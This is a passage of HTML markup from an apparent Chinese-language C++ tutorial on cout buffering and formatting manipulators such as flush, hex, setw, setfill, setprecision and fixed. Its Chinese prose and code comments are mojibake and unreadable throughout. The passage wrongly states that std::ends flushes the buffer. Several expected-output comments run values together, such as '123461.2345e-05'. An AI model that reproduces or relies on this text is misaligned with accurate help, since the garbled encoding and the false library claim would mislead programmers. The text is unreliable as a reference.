class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Processing...&quot;</span> &lt;&lt; <span class="built_in">std</span>::flush; <span class="comment">// ç«‹å³æ˜¾ç¤º &quot;Processing...&quot;ï¼Œä¸æ¢è¡Œ</span></span><br><span class="line"><span class="comment">// ...é•¿æ—¶é—´æ“ä½œ...</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; Done.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::ends</code> (Manipulator):</strong> å‘æµä¸­æ’å…¥ä¸€ä¸ª<strong>ç©ºå­—ç¬¦ (<code>\0</code>)**ï¼Œç„¶å</strong>åˆ·æ–°**ç¼“å†²åŒºã€‚è¿™åœ¨ä¸å…¶ä»–éœ€è¦ç©ºå­—ç¬¦ç»“å°¾å­—ç¬¦ä¸²çš„ç³»ç»Ÿäº¤äº’æ—¶å¯èƒ½æœ‰ç”¨ï¼Œä½†ä¸å¤ªå¸¸è§ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Null terminated&quot;</span> &lt;&lt; <span class="built_in">std</span>::ends;</span><br></pre></td></tr></table></figure></li><li><p> <strong>ç¨‹åºæ­£å¸¸ç»“æŸ:</strong> å½“ <code>main</code> å‡½æ•°è¿”å›æˆ–è°ƒç”¨ <code>exit()</code> æ—¶ï¼Œé€šå¸¸ä¼šè‡ªåŠ¨åˆ·æ–°æ‰€æœ‰æ‰“å¼€çš„è¾“å‡ºæµã€‚</p></li><li><p> <strong>ç¼“å†²åŒºæ»¡:</strong> å½“ç¼“å†²åŒºæ»¡æ—¶ä¼šè‡ªåŠ¨åˆ·æ–°ã€‚</p></li><li><p> <strong>ä¸è¾“å…¥å…³è”:</strong> å½“ <code>cin</code> éœ€è¦ä»ç”¨æˆ·é‚£é‡Œè¯»å–æ•°æ®ï¼Œå¹¶ä¸” <code>cout</code> çš„ç¼“å†²åŒºä¸­æœ‰å¾…è¾“å‡ºçš„å†…å®¹æ—¶ï¼Œé€šå¸¸ä¼šå…ˆåˆ·æ–° <code>cout</code> çš„ç¼“å†²åŒºï¼ˆä»¥ç¡®ä¿æç¤ºä¿¡æ¯å…ˆæ˜¾ç¤ºå‡ºæ¥ï¼‰ã€‚</p></li></ol><p><strong><code>endl</code> vs. <code>&#39;\n&#39;</code>:</strong></p><ul><li>  <code>cout &lt;&lt; endl;</code> ç­‰ä»·äº <code>cout &lt;&lt; &#39;\n&#39; &lt;&lt; flush;</code></li><li>  <code>cout &lt;&lt; &#39;\n&#39;;</code> åªæ’å…¥æ¢è¡Œç¬¦ï¼Œ<strong>ä¸ä¿è¯</strong>ç«‹å³åˆ·æ–°ç¼“å†²åŒºï¼ˆé™¤éæµæ˜¯è¡Œç¼“å†²ä¸”è¿æ¥åˆ°ç»ˆç«¯ï¼‰ã€‚</li></ul><p>åœ¨æ€§èƒ½æ•æ„Ÿçš„ä»£ç ä¸­ï¼ˆä¾‹å¦‚å¤§é‡å¾ªç¯è¾“å‡ºï¼‰ï¼Œé¢‘ç¹ä½¿ç”¨ <code>endl</code> å¯èƒ½ä¼šå› ä¸ºä¸å¿…è¦çš„åˆ·æ–°è€Œé™ä½æ•ˆç‡ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœä¸éœ€è¦æ¯æ¬¡éƒ½ç«‹å³çœ‹åˆ°è¾“å‡ºï¼Œå¯ä»¥åªä½¿ç”¨ <code>&#39;\n&#39;</code>ï¼Œè®©ç¼“å†²åŒºåœ¨æ›´åˆé€‚çš„æ—¶æœºï¼ˆå¦‚ç¼“å†²åŒºæ»¡æˆ–ç¨‹åºç»“æŸï¼‰åˆ·æ–°ã€‚</p><h3 id="17-2-4-ç”¨-cout-è¿›è¡Œæ ¼å¼åŒ–"><a href="#17-2-4-ç”¨-cout-è¿›è¡Œæ ¼å¼åŒ–" class="headerlink" title="17.2.4 ç”¨ cout è¿›è¡Œæ ¼å¼åŒ–"></a>17.2.4 ç”¨ cout è¿›è¡Œæ ¼å¼åŒ–</h3><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>cout</code> ä¼šæ ¹æ®æ•°æ®çš„ç±»å‹é€‰æ‹©ä¸€ç§â€œåˆç†â€çš„æ ¼å¼è¿›è¡Œè¾“å‡ºã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡å¤šç§æ–¹å¼æ§åˆ¶è¾“å‡ºçš„æ ¼å¼ï¼Œä¾‹å¦‚å­—æ®µå®½åº¦ã€å°æ•°ä½æ•°ã€å¯¹é½æ–¹å¼ã€æ•°å­—åŸºæ•°ç­‰ã€‚</p><p>æ ¼å¼åŒ–å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼è®¾ç½®ï¼š</p><ul><li>  <strong><code>ios_base</code> æˆå‘˜å‡½æ•°:</strong> <code>ios_base</code> ç±»ï¼ˆ<code>ostream</code> çš„åŸºç±»ï¼‰æä¾›äº†ä¸€äº›æˆå‘˜å‡½æ•°æ¥è®¾ç½®æ ¼å¼æ ‡å¿—ã€‚</li><li>  <strong>æ“çºµç¬¦ (Manipulators):</strong> å®šä¹‰åœ¨ <code>&lt;iostream&gt;</code> å’Œ <code>&lt;iomanip&gt;</code> ä¸­çš„ç‰¹æ®Šå‡½æ•°ï¼Œå¯ä»¥åƒæ’å…¥å€¼ä¸€æ ·æ’å…¥åˆ° <code>cout</code> è¯­å¥ä¸­æ¥æ”¹å˜æµçš„çŠ¶æ€ã€‚ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´æ–¹ä¾¿ã€‚</li></ul><h4 id="1-ä¿®æ”¹æ•°å€¼çš„åŸºæ•°-dec-hex-oct"><a href="#1-ä¿®æ”¹æ•°å€¼çš„åŸºæ•°-dec-hex-oct" class="headerlink" title="1. ä¿®æ”¹æ•°å€¼çš„åŸºæ•° (dec, hex, oct)"></a>1. ä¿®æ”¹æ•°å€¼çš„åŸºæ•° (<code>dec</code>, <code>hex</code>, <code>oct</code>)</h4><p>å¯ä»¥ä½¿ç”¨æ“çºµç¬¦ <code>dec</code>, <code>hex</code>, <code>oct</code> æ¥æ”¹å˜æ•´æ•°è¾“å‡ºçš„åŸºæ•°ï¼ˆé»˜è®¤ä¸ºåè¿›åˆ¶ <code>dec</code>ï¼‰ã€‚è¿™äº›è®¾ç½®æ˜¯<strong>ç²˜æ€§ (sticky)</strong> çš„ï¼Œå³ä¸€æ—¦è®¾ç½®ï¼Œåç»­æ‰€æœ‰æ•´æ•°è¾“å‡ºéƒ½ä¼šé‡‡ç”¨è¯¥åŸºæ•°ï¼Œç›´åˆ°è¢«é‡æ–°è®¾ç½®ä¸ºæ­¢ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">255</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default (decimal): &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 255</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::hex; <span class="comment">// è®¾ç½®ä¸ºåå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hexadecimal: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º ff</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::oct; <span class="comment">// è®¾ç½®ä¸ºå…«è¿›åˆ¶</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 377</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::dec; <span class="comment">// æ¢å¤ä¸ºåè¿›åˆ¶</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Decimal again: &quot;</span> &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 255</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// é…åˆ showbase å’Œ uppercase</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::showbase &lt;&lt; <span class="built_in">std</span>::uppercase; <span class="comment">// æ˜¾ç¤ºåŸºæ•°å‰ç¼€å¹¶ä½¿ç”¨å¤§å†™å­—æ¯</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hex with base and uppercase: &quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0XFF</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Octal with base: &quot;</span> &lt;&lt; <span class="built_in">std</span>::oct &lt;&lt; num &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 0377</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::noshowbase &lt;&lt; <span class="built_in">std</span>::nouppercase &lt;&lt; <span class="built_in">std</span>::dec; <span class="comment">// æ¢å¤é»˜è®¤</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>showbase</code>: æ˜¾ç¤ºæ•°å€¼åŸºæ•°çš„å‰ç¼€ï¼ˆ<code>0x</code> æˆ– <code>0X</code> è¡¨ç¤ºåå…­è¿›åˆ¶ï¼Œ<code>0</code> è¡¨ç¤ºå…«è¿›åˆ¶ï¼‰ã€‚</li><li>  <code>noshowbase</code>: ä¸æ˜¾ç¤ºåŸºæ•°å‰ç¼€ï¼ˆé»˜è®¤ï¼‰ã€‚</li><li>  <code>uppercase</code>: åå…­è¿›åˆ¶è¾“å‡ºæ—¶ä½¿ç”¨å¤§å†™å­—æ¯ <code>A-F</code> å’Œ <code>X</code>ã€‚</li><li>  <code>nouppercase</code>: ä½¿ç”¨å°å†™å­—æ¯ï¼ˆé»˜è®¤ï¼‰ã€‚</li></ul><h4 id="2-è°ƒæ•´å­—æ®µå®½åº¦-width-setw"><a href="#2-è°ƒæ•´å­—æ®µå®½åº¦-width-setw" class="headerlink" title="2. è°ƒæ•´å­—æ®µå®½åº¦ (width(), setw())"></a>2. è°ƒæ•´å­—æ®µå®½åº¦ (<code>width()</code>, <code>setw()</code>)</h4><p>å¯ä»¥æŒ‡å®šè¾“å‡ºä¸‹ä¸€ä¸ªå€¼æ—¶ä½¿ç”¨çš„<strong>æœ€å°å­—æ®µå®½åº¦</strong>ã€‚å¦‚æœå€¼çš„å®é™…å®½åº¦å°äºæŒ‡å®šå®½åº¦ï¼Œåˆ™ç”¨å¡«å……å­—ç¬¦ï¼ˆé»˜è®¤ä¸ºç©ºæ ¼ï¼‰å¡«å……ã€‚</p><ul><li>  <strong><code>cout.width(int w)</code> (æˆå‘˜å‡½æ•°):</strong> è®¾ç½®ä¸‹ä¸€æ¬¡è¾“å‡ºçš„æœ€å°å®½åº¦ä¸º <code>w</code>ã€‚<strong>åªå¯¹ç´§éšå…¶åçš„ä¸‹ä¸€æ¬¡è¾“å‡ºæœ‰æ•ˆ</strong>ï¼Œä¹‹åä¼šè‡ªåŠ¨æ¢å¤é»˜è®¤ï¼ˆå®½åº¦ä¸º 0ï¼‰ã€‚</li><li>  <strong><code>setw(int w)</code> (æ“çºµç¬¦, <code>&lt;iomanip&gt;</code>):</strong> ä¸ <code>width()</code> æ•ˆæœç›¸åŒï¼Œä¹Ÿæ˜¯<strong>åªå¯¹ä¸‹ä¸€æ¬¡è¾“å‡ºæœ‰æ•ˆ</strong>ã€‚ä½¿ç”¨ <code>setw</code> é€šå¸¸æ›´æ–¹ä¾¿ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setw</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> val = <span class="number">12.3</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *12.3*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.width(<span class="number">10</span>); <span class="comment">// è®¾ç½®å®½åº¦ä¸º 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *      12.3* (å³å¯¹é½)</span></span><br><span class="line">    <span class="comment">// å®½åº¦è®¾ç½®å¤±æ•ˆ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *12.3*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ setw</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">10</span>) &lt;&lt; val &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">5</span>) &lt;&lt; <span class="string">&quot;Hi&quot;</span> &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// è¾“å‡º *      12.3*   Hi*</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-å¡«å……å­—ç¬¦-fill"><a href="#3-å¡«å……å­—ç¬¦-fill" class="headerlink" title="3. å¡«å……å­—ç¬¦ (fill())"></a>3. å¡«å……å­—ç¬¦ (<code>fill()</code>)</h4><p>å½“å­—æ®µå®½åº¦å¤§äºå€¼çš„å®é™…å®½åº¦æ—¶ï¼Œç”¨äºå¡«å……ç©ºç™½åŒºåŸŸçš„å­—ç¬¦å¯ä»¥é€šè¿‡ <code>fill()</code> æˆå‘˜å‡½æ•°æˆ– <code>setfill()</code> æ“çºµç¬¦è®¾ç½®ã€‚è¿™ä¸ªè®¾ç½®æ˜¯<strong>ç²˜æ€§</strong>çš„ã€‚</p><ul><li>  <strong><code>cout.fill(char ch)</code> (æˆå‘˜å‡½æ•°):</strong> è®¾ç½®å¡«å……å­—ç¬¦ä¸º <code>ch</code>ã€‚è¿”å›ä¹‹å‰çš„å¡«å……å­—ç¬¦ã€‚</li><li>  <strong><code>setfill(char ch)</code> (æ“çºµç¬¦, <code>&lt;iomanip&gt;</code>):</strong> è®¾ç½®å¡«å……å­—ç¬¦ä¸º <code>ch</code>ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setw, setfill</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">42</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º *    42*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.fill(<span class="string">&#x27;*&#x27;</span>); <span class="comment">// è®¾ç½®å¡«å……å­—ç¬¦ä¸º &#x27;*&#x27;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Star fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º ****42*</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ setfill</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dash fill: *&quot;</span> &lt;&lt; <span class="built_in">std</span>::setfill(<span class="string">&#x27;-&#x27;</span>) &lt;&lt; <span class="built_in">std</span>::setw(<span class="number">6</span>) &lt;&lt; num &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º ----42*</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.fill(<span class="string">&#x27; &#x27;</span>); <span class="comment">// æ¢å¤é»˜è®¤å¡«å……å­—ç¬¦</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4-æµ®ç‚¹æ•°ç²¾åº¦-precision-setprecision"><a href="#4-æµ®ç‚¹æ•°ç²¾åº¦-precision-setprecision" class="headerlink" title="4. æµ®ç‚¹æ•°ç²¾åº¦ (precision(), setprecision())"></a>4. æµ®ç‚¹æ•°ç²¾åº¦ (<code>precision()</code>, <code>setprecision()</code>)</h4><p>å¯ä»¥æ§åˆ¶æµ®ç‚¹æ•°è¾“å‡ºçš„<strong>å°æ•°ä½æ•°</strong>æˆ–<strong>æ€»æœ‰æ•ˆæ•°å­—ä½æ•°</strong>ï¼Œå…·ä½“å–å†³äºæµ®ç‚¹æ•°æ ¼å¼ï¼ˆè§ä¸‹æ–‡ï¼‰ã€‚</p><ul><li>  <strong><code>cout.precision(int p)</code> (æˆå‘˜å‡½æ•°):</strong> è®¾ç½®ç²¾åº¦ä¸º <code>p</code>ã€‚è¿”å›ä¹‹å‰çš„ç²¾åº¦å€¼ã€‚é»˜è®¤ç²¾åº¦é€šå¸¸æ˜¯ 6ã€‚è¿™ä¸ªè®¾ç½®æ˜¯<strong>ç²˜æ€§</strong>çš„ã€‚</li><li>  <strong><code>setprecision(int p)</code> (æ“çºµç¬¦, <code>&lt;iomanip&gt;</code>):</strong> è®¾ç½®ç²¾åº¦ä¸º <code>p</code>ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for setprecision</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;   // for M_PI</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> pi = M_PI; <span class="comment">// å¤§çº¦ 3.14159265...</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default precision: &quot;</span> &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é€šå¸¸è¾“å‡º 6 ä½æœ‰æ•ˆæ•°å­—</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">4</span>); <span class="comment">// è®¾ç½®ç²¾åº¦ä¸º 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precision 4: &quot;</span> &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3.142 (é»˜è®¤æ¨¡å¼ä¸‹æ˜¯æœ‰æ•ˆæ•°å­—)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ setprecision</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Precision 8: &quot;</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">8</span>) &lt;&lt; pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 3.1415927</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">6</span>); <span class="comment">// æ¢å¤é»˜è®¤ç²¾åº¦</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-æµ®ç‚¹æ•°æ ¼å¼-setf-unsetf-fixed-scientific"><a href="#5-æµ®ç‚¹æ•°æ ¼å¼-setf-unsetf-fixed-scientific" class="headerlink" title="5. æµ®ç‚¹æ•°æ ¼å¼ (setf(), unsetf(), fixed, scientific)"></a>5. æµ®ç‚¹æ•°æ ¼å¼ (<code>setf()</code>, <code>unsetf()</code>, <code>fixed</code>, <code>scientific</code>)</h4><p>å¯ä»¥æ§åˆ¶æµ®ç‚¹æ•°æ˜¯ä»¥<strong>å®šç‚¹è¡¨ç¤ºæ³• (fixed)</strong> è¿˜æ˜¯<strong>ç§‘å­¦è®¡æ•°æ³• (scientific)</strong> æ˜¾ç¤ºã€‚</p><ul><li>  <strong><code>fixed</code> (æ“çºµç¬¦):</strong> ä½¿ç”¨å®šç‚¹è¡¨ç¤ºæ³•ã€‚æ­¤æ—¶ï¼Œ<code>precision()</code> æ§åˆ¶çš„æ˜¯<strong>å°æ•°ç‚¹å</strong>çš„ä½æ•°ã€‚</li><li>  <strong><code>scientific</code> (æ“çºµç¬¦):</strong> ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ï¼ˆä¾‹å¦‚ <code>1.23e+04</code>ï¼‰ã€‚æ­¤æ—¶ï¼Œ<code>precision()</code> æ§åˆ¶çš„æ˜¯<strong>å°æ•°ç‚¹å</strong>çš„ä½æ•°ã€‚</li><li>  <strong>é»˜è®¤æ ¼å¼:</strong> å¦‚æœæ—¢æœªè®¾ç½® <code>fixed</code> ä¹Ÿæœªè®¾ç½® <code>scientific</code>ï¼Œåˆ™ <code>cout</code> ä¼šè‡ªåŠ¨é€‰æ‹©ä¸€ç§æ ¼å¼ï¼ˆå®šç‚¹æˆ–ç§‘å­¦è®¡æ•°æ³•ï¼‰ï¼Œä»¥äº§ç”Ÿæ›´ç´§å‡‘çš„è¡¨ç¤ºã€‚æ­¤æ—¶ï¼Œ<code>precision()</code> æ§åˆ¶çš„æ˜¯<strong>æ€»çš„æœ‰æ•ˆæ•°å­—</strong>ä½æ•°ï¼ˆæ•´æ•°éƒ¨åˆ†+å°æ•°éƒ¨åˆ†ï¼‰ã€‚</li><li>  <strong><code>ios_base::floatfield</code>:</strong> <code>fixed</code> å’Œ <code>scientific</code> éƒ½æ˜¯æ ¼å¼æ ‡å¿—ä½ã€‚å¯ä»¥ä½¿ç”¨ <code>cout.setf(ios_base::fixed, ios_base::floatfield)</code> å’Œ <code>cout.setf(ios_base::scientific, ios_base::floatfield)</code> æ¥è®¾ç½®ï¼Œä½¿ç”¨ <code>cout.unsetf(ios_base::floatfield)</code> æ¥æ¸…é™¤è®¾ç½®æ¢å¤é»˜è®¤è¡Œä¸ºã€‚ä½¿ç”¨æ“çºµç¬¦é€šå¸¸æ›´ç®€å•ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // for fixed, scientific, setprecision</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> num1 = <span class="number">12345.6789</span>;</span><br><span class="line">    <span class="keyword">double</span> num2 = <span class="number">0.000012345</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">5</span>); <span class="comment">// è®¾ç½®ç²¾åº¦ä¸º 5</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Default format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 123461.2345e-05 (ç²¾åº¦5è¡¨ç¤ºæœ‰æ•ˆæ•°å­—)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::fixed; <span class="comment">// è®¾ç½®ä¸ºå®šç‚¹æ ¼å¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fixed format:\n&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot;\t&quot;</span> &lt;&lt; num2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 12345.678900.00001 